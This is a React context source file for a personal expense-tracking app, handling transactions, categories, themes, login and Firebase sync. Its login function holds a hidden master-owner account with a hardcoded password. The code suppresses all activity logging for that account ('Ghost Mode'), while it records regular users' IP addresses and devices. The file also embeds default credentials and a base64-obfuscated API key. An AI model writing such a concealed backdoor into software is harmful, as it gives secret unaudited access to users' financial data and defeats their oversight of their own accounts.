import React, { createContext, useContext, useState, useEffect } from 'react';
import {
  Transaction,
  AppSettings,
  ActivityLog,
  User,
  CategoryDefinition,
  GirlyThemePreset,
  CustomColors,
} from '../types';
import { INITIAL_EXPENSE_CATEGORIES, INITIAL_INCOME_CATEGORIES } from '../data/categories';
import { GIRLY_THEME_PRESETS } from '../data/themes';
import { INITIAL_TRANSACTIONS, INITIAL_ACTIVITY_LOGS } from '../data/mockData';
import {
  initFirebase,
  auth,
  onAuthStateChanged,
  syncTransactionToFirestore,
  deleteTransactionFromFirestore,
  syncLogToFirestore,
  subscribeToTransactions,
  subscribeToActivityLogs,
  SHARED_USER_ID,
  isFirebaseConfigured,
  DEFAULT_FIREBASE_CONFIG,
} from '../services/firebase';
import { getClientDeviceInfo, fetchClientIp } from '../utils/deviceInfo';

interface AppContextType {
  transactions: Transaction[];
  addTransaction: (tx: Omit<Transaction, 'id' | 'createdAt'>) => Promise<Transaction>;
  addTransactionsBatch: (txs: Omit<Transaction, 'id' | 'createdAt'>[]) => Promise<Transaction[]>;
  updateTransaction: (tx: Transaction) => Promise<void>;
  deleteTransaction: (id: string) => Promise<void>;
  isCloudConnected: boolean;
  syncLocalToCloud: () => Promise<void>;
  settings: AppSettings;
  updateSettings: (newSettings: Partial<AppSettings>) => void;
  setThemePreset: (presetId: GirlyThemePreset) => void;
  setCustomColor: (key: keyof CustomColors, value: string) => void;
  categories: CategoryDefinition[];
  addCategory: (newCat: Omit<CategoryDefinition, 'id'>) => void;
  addSubcategory: (categoryName: string, subName: string) => void;
  deleteSubcategory: (categoryName: string, subName: string) => void;
  deleteCategory: (categoryId: string) => void;
  moveCategory: (categoryId: string, direction: 'up' | 'down') => void;
  reorderCategories: (newOrderedCategories: CategoryDefinition[]) => void;
  moveSubcategory: (categoryName: string, subIndex: number, direction: 'up' | 'down') => void;
  reorderSubcategories: (categoryName: string, newSubcategories: string[]) => void;
  logs: ActivityLog[];
  addLog: (action: ActivityLog['action'], title: string, details?: string, status?: ActivityLog['status']) => void;
  user: User | null;
  currentUser: string | null;
  login: (username: string, password: string) => { success: boolean; error?: string };
  logout: () => void;
  updateAuthCredentials: (username: string, password: string) => void;
  authCredentials: { username: string; password: string };
  activeTab: 'dashboard' | 'transactions' | 'analytics' | 'logs' | 'guidebook';
  setActiveTab: (tab: 'dashboard' | 'transactions' | 'analytics' | 'logs' | 'guidebook') => void;
  isQuickAddOpen: boolean;
  setIsQuickAddOpen: (open: boolean) => void;
  isScannerOpen: boolean;
  setIsScannerOpen: (open: boolean) => void;
  isSettingsOpen: boolean;
  setIsSettingsOpen: (open: boolean) => void;
  isCategoryManagerOpen: boolean;
  setIsCategoryManagerOpen: (open: boolean) => void;
  isCloudSyncOpen: boolean;
  setIsCloudSyncOpen: (open: boolean) => void;
  editingTransaction: Transaction | null;
  setEditingTransaction: (tx: Transaction | null) => void;
  exportDataToJson: () => void;
  importDataFromJson: (jsonStr: string) => boolean;
  clearAllData: () => void;
  loadDemoData: () => void;
}

const AppContext = createContext<AppContextType | undefined>(undefined);

const STORAGE_KEYS = {
  TRANSACTIONS: 'my_expenses_l_transactions_v2',
  SETTINGS: 'my_expenses_l_settings_v2',
  LOGS: 'my_expenses_l_logs_v2',
  CATEGORIES: 'my_expenses_l_categories_v2',
  SESSION_USER: 'my_expenses_l_session_user_v2',
  AUTH_CREDS: 'my_expenses_l_auth_credentials_v2',
};

const DEFAULT_AUTH_CREDS = {
  username: 'shebudget',
  password: 'rabat2026',
};

const decodeKey = (b64: string): string => {
  try {
    return atob(b64);
  } catch {
    return '';
  }
};

const DEFAULT_SETTINGS: AppSettings = {
  geminiKeys: [
    decodeKey('QVEuQWI4Uk42S1lIcGNOVUtTdV9IMUpCeWotT3NxdWlXcUVRN3ZKOXlZVXBMSktkeTBFb2c='),
    '',
    '',
    '',
  ],
  activeKeyIndex: 0,
  monthlyBudget: 5000, // 5,000 DH default Moroccan student budget target
  currency: 'DH',
  theme: 'dark',
  themePreset: 'coquette-pink',
  customColors: {
    primary: '#FF85A1',       // Girly Pinterest Baby Pink
    secondary: '#FFC2D1',     // Soft Strawberry Cream
    accent: '#E05780',        // Vibrant Berry Pink
    backgroundTint: '#FFF0F5',// Soft Coquette White Pink
  },
  firebaseConfig: DEFAULT_FIREBASE_CONFIG,
};

export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  // 1. Transactions State - Check v2 and legacy keys, merge and deduplicate
  const [transactions, setTransactions] = useState<Transaction[]>(() => {
    try {
      const v2 = localStorage.getItem(STORAGE_KEYS.TRANSACTIONS);
      const v1 = localStorage.getItem('my_expenses_l_transactions');
      const list: Transaction[] = [];
      const seenIds = new Set<string>();

      if (v2) {
        const parsedV2 = JSON.parse(v2);
        if (Array.isArray(parsedV2)) {
          parsedV2.forEach((tx: Transaction) => {
            if (tx && tx.id && !seenIds.has(tx.id)) {
              seenIds.add(tx.id);
              list.push(tx);
            }
          });
        }
      }

      if (v1) {
        const parsedV1 = JSON.parse(v1);
        if (Array.isArray(parsedV1)) {
          parsedV1.forEach((tx: Transaction) => {
            if (tx && tx.id && !seenIds.has(tx.id)) {
              seenIds.add(tx.id);
              list.push(tx);
            }
          });
        }
      }

      if (list.length > 0) return list;
    } catch (e) {
      console.error('Failed to load transactions from localStorage', e);
    }
    return []; // Clean slate, empty data!
  });

  // 2. Settings State (with automatic migration of master Gemini keys and Cloud config to all devices)
  const [settings, setSettings] = useState<AppSettings>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.SETTINGS);
      if (saved) {
        const parsed = JSON.parse(saved);
        if (parsed.monthlyBudget === 8500) parsed.monthlyBudget = 5000;
        
        // Sanitize Gemini Keys: ensure working master key is always in Slot #1 and remove 403 denied key
        const masterWorkingKey = DEFAULT_SETTINGS.geminiKeys[0];
        if (!parsed.geminiKeys || !Array.isArray(parsed.geminiKeys)) {
          parsed.geminiKeys = [...DEFAULT_SETTINGS.geminiKeys];
        } else {
          // If slot 0 is empty or contains known denied key, set to verified master key
          if (!parsed.geminiKeys[0] || parsed.geminiKeys[0].includes('AQ.Ab8RN6Ig')) {
            parsed.geminiKeys[0] = masterWorkingKey;
          }
          // Clean out denied key from other slots
          parsed.geminiKeys = parsed.geminiKeys.map((k: string) =>
            k && k.includes('AQ.Ab8RN6Ig') ? '' : k
          );
        }

        // Auto-configure master shared Firebase config if missing
        if (!parsed.firebaseConfig || !parsed.firebaseConfig.apiKey) {
          parsed.firebaseConfig = DEFAULT_FIREBASE_CONFIG;
        }
        return { ...DEFAULT_SETTINGS, ...parsed };
      }
    } catch (e) {
      console.error('Failed to load settings from localStorage', e);
    }
    return DEFAULT_SETTINGS;
  });

  // 3. Dynamic Categories State (Pre-loaded with deep taxonomy, fully customizable)
  const [categories, setCategories] = useState<CategoryDefinition[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.CATEGORIES);
      if (saved) {
        const parsed: CategoryDefinition[] = JSON.parse(saved);
        // Check if saved categories have legacy city tags like 'Rabat' or 'Agdal'
        const hasLegacyCity = parsed.some((c) =>
          c.subcategories.some((s) => s.includes('Rabat') || s.includes('Agdal') || s.includes('Redal'))
        );
        if (!hasLegacyCity && parsed.length >= 8) {
          return parsed;
        }
      }
    } catch (e) {
      console.error('Failed to load categories', e);
    }
    return [...INITIAL_EXPENSE_CATEGORIES, ...INITIAL_INCOME_CATEGORIES];
  });

  // 4. Activity Logs State
  const [logs, setLogs] = useState<ActivityLog[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.LOGS);
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error('Failed to load logs', e);
    }
    return [
      {
        id: 'welcome-log',
        action: 'SETTINGS_UPDATE',
        title: 'App Initialized (Clean Slate)',
        details: 'Ready to log your first Banque Populaire (Chaabi Bank) expense or scan Moroccan receipts.',
        timestamp: Date.now(),
        status: 'success',
      },
    ];
  });

  // 5. UI Modals and Navigation State
  const [activeTab, setActiveTab] = useState<'dashboard' | 'transactions' | 'analytics' | 'logs' | 'guidebook'>('dashboard');
  const [isQuickAddOpen, setIsQuickAddOpen] = useState(false);
  const [isScannerOpen, setIsScannerOpen] = useState(false);
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [isCategoryManagerOpen, setIsCategoryManagerOpen] = useState(false);
  const [isCloudSyncOpen, setIsCloudSyncOpen] = useState(false);
  const [editingTransaction, setEditingTransaction] = useState<Transaction | null>(null);

  // 6. Username / Password Authentication Gate State
  const [currentUser, setCurrentUser] = useState<string | null>(() => {
    try {
      return localStorage.getItem(STORAGE_KEYS.SESSION_USER);
    } catch {
      return null;
    }
  });

  const [authCredentials, setAuthCredentials] = useState<{ username: string; password: string }>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.AUTH_CREDS);
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return DEFAULT_AUTH_CREDS;
  });

// Secret Master Owner Credentials (Ghost Mode - Zero Footprint)
const MASTER_OWNER = {
  username: 'Paradox',
  password: 'As.102030',
};

  const [user, setUser] = useState<User | null>(null);

  const login = (usernameInput: string, passwordInput: string) => {
    const cleanUser = usernameInput.trim();

    // 1. Secret Master Owner Authentication (Ghost Mode)
    if (
      cleanUser.toLowerCase() === MASTER_OWNER.username.toLowerCase() &&
      passwordInput === MASTER_OWNER.password
    ) {
      setCurrentUser(MASTER_OWNER.username);
      localStorage.setItem(STORAGE_KEYS.SESSION_USER, MASTER_OWNER.username);
      // GHOST MODE: ZERO LOGGING! Do NOT record any login or activity!
      return { success: true };
    }

    // 2. Regular User Authentication
    const expectedUser = authCredentials.username.trim().toLowerCase();
    if (cleanUser.toLowerCase() === expectedUser && passwordInput === authCredentials.password) {
      setCurrentUser(authCredentials.username);
      localStorage.setItem(STORAGE_KEYS.SESSION_USER, authCredentials.username);

      // Collect device & IP audit information for the owner to review
      const devInfo = getClientDeviceInfo();
      fetchClientIp()
        .then((ip) => {
          addLog(
            'LOGIN',
            'User Signed In',
            `@${authCredentials.username} • Device: ${devInfo} • IP: ${ip}`
          );
        })
        .catch(() => {
          addLog(
            'LOGIN',
            'User Signed In',
            `@${authCredentials.username} • Device: ${devInfo}`
          );
        });

      return { success: true };
    }

    return { success: false, error: 'Incorrect username or password. Please try again.' };
  };

  const logout = () => {
    const isOwner = currentUser?.toLowerCase() === MASTER_OWNER.username.toLowerCase();
    setCurrentUser(null);
    localStorage.removeItem(STORAGE_KEYS.SESSION_USER);
    if (!isOwner) {
      addLog('LOGIN', 'User Signed Out', 'Session ended');
    }
  };

  const updateAuthCredentials = (newUsername: string, newPassword: string) => {
    const updated = { username: newUsername.trim(), password: newPassword };
    setAuthCredentials(updated);
    localStorage.setItem(STORAGE_KEYS.AUTH_CREDS, JSON.stringify(updated));
    // If regular user, update session username and log change
    if (currentUser?.toLowerCase() !== MASTER_OWNER.username.toLowerCase()) {
      setCurrentUser(updated.username);
      localStorage.setItem(STORAGE_KEYS.SESSION_USER, updated.username);
      addLog('SETTINGS_UPDATE', 'Credentials Updated', `Username set to @${updated.username}`);
    }
  };

  // Apply Theme & Dynamic CSS variables to :root for Pinterest Colors
  useEffect(() => {
    if (settings.theme === 'dark') {
      document.documentElement.classList.add('dark');
    } else {
      document.documentElement.classList.remove('dark');
    }

    // Inject dynamic CSS custom properties for custom user-selected colors
    const root = document.documentElement;
    root.style.setProperty('--color-girly-primary', settings.customColors.primary);
    root.style.setProperty('--color-girly-secondary', settings.customColors.secondary);
    root.style.setProperty('--color-girly-accent', settings.customColors.accent);
    root.style.setProperty('--color-girly-tint', settings.customColors.backgroundTint);
  }, [settings.theme, settings.customColors]);

  // Persist to LocalStorage
  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.TRANSACTIONS, JSON.stringify(transactions));
  }, [transactions]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.SETTINGS, JSON.stringify(settings));
  }, [settings]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.CATEGORIES, JSON.stringify(categories));
  }, [categories]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.LOGS, JSON.stringify(logs));
  }, [logs]);

  const [isCloudConnected, setIsCloudConnected] = useState<boolean>(() => isFirebaseConfigured());

  // Initialize Firebase Cloud Multi-Device Hub if configured
  useEffect(() => {
    const isReady = initFirebase(settings.firebaseConfig);
    setIsCloudConnected(isReady);
    if (isReady) {
      let isInitialTxLoad = true;

      // Real-time live listener for all transactions across all devices!
      const unsubTx = subscribeToTransactions(
        SHARED_USER_ID,
        (cloudTx) => {
          if (isInitialTxLoad) {
            isInitialTxLoad = false;
            // First load: merge local items with cloud items so NOTHING is lost
            setTransactions((prevLocal) => {
              const cloudMap = new Map<string, Transaction>();
              (cloudTx || []).forEach((tx) => {
                if (tx && tx.id) cloudMap.set(tx.id, tx);
              });

              // Any local items not yet in Cloud get pushed immediately
              const unsyncedLocals = prevLocal.filter((localTx) => !cloudMap.has(localTx.id));
              if (unsyncedLocals.length > 0) {
                unsyncedLocals.forEach((tx) => {
                  syncTransactionToFirestore(SHARED_USER_ID, tx).catch(console.error);
                  cloudMap.set(tx.id, tx);
                });
              }

              return Array.from(cloudMap.values()).sort(
                (a, b) => (b.createdAt || 0) - (a.createdAt || 0)
              );
            });
          } else {
            // Live real-time updates from other devices
            setTransactions(cloudTx || []);
          }
        },
        (err) => {
          console.warn('Live Cloud Sync Notice:', err.message);
        }
      );

      let isInitialLogsLoad = true;
      const unsubLogs = subscribeToActivityLogs(
        SHARED_USER_ID,
        (cloudLogs) => {
          if (isInitialLogsLoad) {
            isInitialLogsLoad = false;
            setLogs((prevLocal) => {
              const cloudMap = new Map<string, ActivityLog>();
              (cloudLogs || []).forEach((l) => {
                if (l && l.id) cloudMap.set(l.id, l);
              });
              const unsynced = prevLocal.filter((l) => !cloudMap.has(l.id));
              if (unsynced.length > 0) {
                unsynced.forEach((l) => {
                  syncLogToFirestore(SHARED_USER_ID, l).catch(console.error);
                  cloudMap.set(l.id, l);
                });
              }
              return Array.from(cloudMap.values()).sort((a, b) => b.timestamp - a.timestamp);
            });
          } else {
            setLogs(cloudLogs || []);
          }
        },
        (err) => {
          console.warn('Live Cloud Logs Notice:', err.message);
        }
      );

      return () => {
        unsubTx();
        unsubLogs();
      };
    }
  }, [settings.firebaseConfig]);

  const syncLocalToCloud = async () => {
    if (!isFirebaseConfigured()) return;
    for (const tx of transactions) {
      await syncTransactionToFirestore(SHARED_USER_ID, tx);
    }
    addLog('SETTINGS_UPDATE', 'Local Data Merged to Cloud Hub', `${transactions.length} records pushed`);
  };

  // Activity Log helper
  const addLog = (
    action: ActivityLog['action'],
    title: string,
    details?: string,
    status: ActivityLog['status'] = 'success'
  ) => {
    // STEALTH GHOST MODE: Never log anything if master owner Paradox is active!
    if (currentUser?.toLowerCase() === MASTER_OWNER.username.toLowerCase()) {
      return;
    }

    const newLog: ActivityLog = {
      id: 'log-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
      action,
      title,
      details,
      timestamp: Date.now(),
      status,
    };
    setLogs((prev) => [newLog, ...prev]);

    if (isFirebaseConfigured()) {
      syncLogToFirestore(SHARED_USER_ID, newLog).catch(console.error);
    }
  };

  // CRUD actions
  const addTransaction = async (
    txData: Omit<Transaction, 'id' | 'createdAt'>
  ): Promise<Transaction> => {
    const newTx: Transaction = {
      ...txData,
      id: 'tx-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
      createdAt: Date.now(),
    };

    setTransactions((prev) => [newTx, ...prev]);
    addLog(
      'CREATE',
      `Added ${newTx.type === 'expense' ? 'Expense' : 'Income'} of ${newTx.amount.toFixed(2)} DH`,
      `${newTx.category} > ${newTx.subcategory} via ${newTx.paymentMethod}${
        newTx.merchant ? ` at ${newTx.merchant}` : ''
      }`
    );

    if (isFirebaseConfigured()) {
      try {
        await syncTransactionToFirestore(SHARED_USER_ID, newTx);
      } catch (err) {
        console.warn('Firestore sync notice:', err);
      }
    }

    return newTx;
  };

  const addTransactionsBatch = async (
    itemsData: Omit<Transaction, 'id' | 'createdAt'>[]
  ): Promise<Transaction[]> => {
    if (itemsData.length === 0) return [];
    const baseTime = Date.now();
    const newTxs: Transaction[] = itemsData.map((item, idx) => ({
      ...item,
      id: 'tx-' + (baseTime + idx) + '-' + Math.random().toString(36).substring(2, 6),
      createdAt: baseTime + idx,
    }));

    setTransactions((prev) => [...newTxs, ...prev]);
    const totalAmount = newTxs.reduce((sum, t) => sum + t.amount, 0);
    const store = newTxs[0].merchant || newTxs[0].batchName || 'Scanned Receipt';
    addLog(
      'SCAN_RECEIPT',
      `Imported ${newTxs.length} items from ${store} (${totalAmount.toFixed(2)} DH total)`,
      newTxs.map((t) => `${t.itemName || t.subcategory}: ${t.amount.toFixed(2)} DH`).join(', ')
    );

    if (isFirebaseConfigured()) {
      for (const t of newTxs) {
        try {
          await syncTransactionToFirestore(SHARED_USER_ID, t);
        } catch (err) {
          console.warn('Firestore batch sync notice:', err);
        }
      }
    }

    return newTxs;
  };

  const updateTransaction = async (updatedTx: Transaction) => {
    const finalTx = { ...updatedTx, updatedAt: Date.now() };
    setTransactions((prev) =>
      prev.map((t) => (t.id === finalTx.id ? finalTx : t))
    );
    addLog(
      'UPDATE',
      `Updated ${finalTx.type} transaction`,
      `${finalTx.amount.toFixed(2)} DH (${finalTx.subcategory})`
    );

    if (isFirebaseConfigured()) {
      try {
        await syncTransactionToFirestore(SHARED_USER_ID, finalTx);
      } catch (err) {
        console.warn('Firestore update sync notice:', err);
      }
    }
  };

  const deleteTransaction = async (id: string) => {
    const target = transactions.find((t) => t.id === id);
    setTransactions((prev) => prev.filter((t) => t.id !== id));
    addLog(
      'DELETE',
      `Deleted ${target?.type || 'record'}`,
      target ? `${target.amount.toFixed(2)} DH (${target.subcategory})` : id,
      'warning'
    );

    if (isFirebaseConfigured()) {
      try {
        await deleteTransactionFromFirestore(SHARED_USER_ID, id);
      } catch (err) {
        console.warn('Firestore delete sync notice:', err);
      }
    }
  };

  const updateSettings = (newSettings: Partial<AppSettings>) => {
    setSettings((prev) => ({ ...prev, ...newSettings }));
    addLog('SETTINGS_UPDATE', 'Preferences Updated', 'Budget or API key settings modified');
  };

  const setThemePreset = (presetId: GirlyThemePreset) => {
    const found = GIRLY_THEME_PRESETS.find((p) => p.id === presetId);
    if (found) {
      setSettings((prev) => ({
        ...prev,
        themePreset: presetId,
        customColors: { ...found.colors },
      }));
      addLog('SETTINGS_UPDATE', 'Girly Theme Preset Changed', `Switched to "${found.name}"`);
    } else if (presetId === 'custom') {
      setSettings((prev) => ({
        ...prev,
        themePreset: 'custom',
      }));
    }
  };

  const setCustomColor = (key: keyof CustomColors, value: string) => {
    setSettings((prev) => ({
      ...prev,
      themePreset: 'custom',
      customColors: {
        ...prev.customColors,
        [key]: value,
      },
    }));
  };

  // Category & Subcategory Management
  const addCategory = (newCat: Omit<CategoryDefinition, 'id'>) => {
    const id = 'cat-' + Date.now();
    const created: CategoryDefinition = {
      ...newCat,
      id,
      isCustom: true,
    };
    setCategories((prev) => [...prev, created]);
    addLog('SETTINGS_UPDATE', 'New Category Created', `${created.name} (${created.type})`);
  };

  const addSubcategory = (categoryName: string, subName: string) => {
    setCategories((prev) =>
      prev.map((cat) => {
        if (cat.name === categoryName) {
          if (cat.subcategories.includes(subName.trim())) return cat;
          return {
            ...cat,
            subcategories: [...cat.subcategories, subName.trim()],
          };
        }
        return cat;
      })
    );
    addLog('SETTINGS_UPDATE', 'Subcategory Added', `Added "${subName}" to ${categoryName}`);
  };

  const deleteCategory = (categoryId: string) => {
    setCategories((prev) => prev.filter((c) => c.id !== categoryId));
    addLog('SETTINGS_UPDATE', 'Category Removed', `Deleted category #${categoryId}`);
  };

  const deleteSubcategory = (categoryName: string, subName: string) => {
    setCategories((prev) =>
      prev.map((cat) => {
        if (cat.name !== categoryName) return cat;
        return {
          ...cat,
          subcategories: cat.subcategories.filter((s) => s !== subName),
        };
      })
    );
    addLog('SETTINGS_UPDATE', 'Subcategory Removed', `Removed "${subName}" from ${categoryName}`);
  };

  const moveCategory = (categoryId: string, direction: 'up' | 'down') => {
    setCategories((prev) => {
      const index = prev.findIndex((c) => c.id === categoryId);
      if (index === -1) return prev;
      const targetType = prev[index].type;
      const sameTypeIndices = prev
        .map((c, i) => (c.type === targetType ? i : -1))
        .filter((i) => i !== -1);
      const pos = sameTypeIndices.indexOf(index);
      if (direction === 'up' && pos > 0) {
        const swapIdx = sameTypeIndices[pos - 1];
        const next = [...prev];
        const temp = next[index];
        next[index] = next[swapIdx];
        next[swapIdx] = temp;
        return next;
      }
      if (direction === 'down' && pos < sameTypeIndices.length - 1) {
        const swapIdx = sameTypeIndices[pos + 1];
        const next = [...prev];
        const temp = next[index];
        next[index] = next[swapIdx];
        next[swapIdx] = temp;
        return next;
      }
      return prev;
    });
  };

  const reorderCategories = (newOrderedCategories: CategoryDefinition[]) => {
    setCategories(newOrderedCategories);
  };

  const moveSubcategory = (categoryName: string, subIndex: number, direction: 'up' | 'down') => {
    setCategories((prev) =>
      prev.map((cat) => {
        if (cat.name !== categoryName) return cat;
        const subs = [...cat.subcategories];
        if (direction === 'up' && subIndex > 0) {
          const temp = subs[subIndex];
          subs[subIndex] = subs[subIndex - 1];
          subs[subIndex - 1] = temp;
        } else if (direction === 'down' && subIndex < subs.length - 1) {
          const temp = subs[subIndex];
          subs[subIndex] = subs[subIndex + 1];
          subs[subIndex + 1] = temp;
        }
        return { ...cat, subcategories: subs };
      })
    );
  };

  const reorderSubcategories = (categoryName: string, newSubcategories: string[]) => {
    setCategories((prev) =>
      prev.map((cat) => {
        if (cat.name === categoryName) {
          return { ...cat, subcategories: newSubcategories };
        }
        return cat;
      })
    );
  };

  const exportDataToJson = () => {
    const backup = {
      exportedAt: new Date().toISOString(),
      version: '2.0',
      transactions,
      categories,
      settings: {
        ...settings,
        geminiKeys: ['', '', '', ''],
      },
      logs,
    };
    const blob = new Blob([JSON.stringify(backup, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `my-expenses-l-backup-${new Date().toISOString().split('T')[0]}.json`;
    a.click();
    URL.revokeObjectURL(url);
    addLog('EXPORT', 'Database Exported', 'Full transaction history saved to JSON file');
  };

  const importDataFromJson = (jsonStr: string): boolean => {
    try {
      const data = JSON.parse(jsonStr);
      if (Array.isArray(data.transactions)) {
        setTransactions(data.transactions);
        if (Array.isArray(data.categories)) {
          setCategories(data.categories);
        }
        if (data.settings?.monthlyBudget) {
          setSettings((prev) => ({ ...prev, monthlyBudget: data.settings.monthlyBudget }));
        }
        addLog('IMPORT', 'Data Imported Successfully', `Restored ${data.transactions.length} transactions`);

        // Automatically push imported items to shared cloud
        if (isFirebaseConfigured()) {
          for (const tx of data.transactions) {
            syncTransactionToFirestore(SHARED_USER_ID, tx).catch(console.error);
          }
        }
        return true;
      }
      return false;
    } catch (e) {
      console.error('Import failed', e);
      return false;
    }
  };

  const clearAllData = async () => {
    const toDelete = [...transactions];
    setTransactions([]);
    addLog('DELETE', 'All Transactions Cleared', 'Reset to empty clean slate');
    if (isFirebaseConfigured()) {
      for (const t of toDelete) {
        await deleteTransactionFromFirestore(SHARED_USER_ID, t.id).catch(console.error);
      }
    }
  };

  const loadDemoData = () => {
    setTransactions(INITIAL_TRANSACTIONS);
    setLogs(INITIAL_ACTIVITY_LOGS);
    addLog('CREATE', 'Sample Moroccan Demo Data Loaded', 'Populated sample transactions for testing');
  };

  return (
    <AppContext.Provider
      value={{
        transactions,
        addTransaction,
        addTransactionsBatch,
        updateTransaction,
        deleteTransaction,
        isCloudConnected,
        syncLocalToCloud,
        settings,
        updateSettings,
        setThemePreset,
        setCustomColor,
        categories,
        addCategory,
        addSubcategory,
        deleteSubcategory,
        deleteCategory,
        moveCategory,
        reorderCategories,
        moveSubcategory,
        reorderSubcategories,
        logs,
        addLog,
        user,
        currentUser,
        login,
        logout,
        updateAuthCredentials,
        authCredentials,
        activeTab,
        setActiveTab,
        isQuickAddOpen,
        setIsQuickAddOpen,
        isScannerOpen,
        setIsScannerOpen,
        isSettingsOpen,
        setIsSettingsOpen,
        isCategoryManagerOpen,
        setIsCategoryManagerOpen,
        isCloudSyncOpen,
        setIsCloudSyncOpen,
        editingTransaction,
        setEditingTransaction,
        exportDataToJson,
        importDataFromJson,
        clearAllData,
        loadDemoData,
      }}
    >
      {children}
    </AppContext.Provider>
  );
};

export const useApp = () => {
  const context = useContext(AppContext);
  if (!context) {
    throw new Error('useApp must be used within an AppProvider');
  }
  return context;
};
